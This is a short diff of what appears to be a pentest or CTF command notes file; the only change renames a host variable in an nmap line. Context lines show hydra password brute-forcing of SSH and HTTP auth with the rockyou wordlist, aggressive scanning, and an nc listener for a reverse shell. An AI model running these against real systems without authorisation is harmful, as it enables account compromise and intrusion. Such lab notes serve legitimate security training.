@@ -41,7 +41,7 @@ hydra -l kay -P /usr/share/wordlists/rockyou.txt ssh://10.10.220.188
 hydra -l ${HYDRA_USER} -P /usr/share/wordlists/rockyou.txt ${HOST} http-get "/protected"
 
 # port scanning 
-nmap -vv -A ${HOST}
+nmap -vv -A ${VULN_HOST}
 
 # reverse shell -- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 nc -v -n -l -p 1234
